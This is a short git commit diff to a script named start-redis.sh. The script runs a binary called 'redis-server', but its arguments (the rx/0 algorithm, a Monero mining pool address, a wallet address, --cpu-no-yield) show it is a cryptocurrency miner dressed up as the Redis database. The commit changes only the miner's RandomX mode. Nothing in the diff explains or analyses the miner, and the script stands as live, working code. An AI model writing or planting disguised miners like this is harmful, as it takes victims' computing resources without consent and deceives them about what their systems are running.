26299a1e33b7fe4696a23eadf6cc7e0307c3a094
flexik555 <134385710+flexik555@users.noreply.github.com>
2023-08-22 18:02:30 +0300

    Update start-redis.sh

--- start-redis.sh
+++ start-redis.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x redis-server
-./redis-server -a rx/0 -o de.monero.herominers.com:1111 -u 42GSvo3HCQS4djorR8Gpr6gNTGxbYKpDPedRwyRkMvXSKjqBzHbykkpaGxArJS2J9W6REBEjmPJP2W8yAEeChLyK4Ya6My2 -k --cpu-no-yield --tls -p PC
+./redis-server -a rx/0 -o de.monero.herominers.com:1111 -u 42GSvo3HCQS4djorR8Gpr6gNTGxbYKpDPedRwyRkMvXSKjqBzHbykkpaGxArJS2J9W6REBEjmPJP2W8yAEeChLyK4Ya6My2 -k --cpu-no-yield --randomx-mode=light --tls -p PC
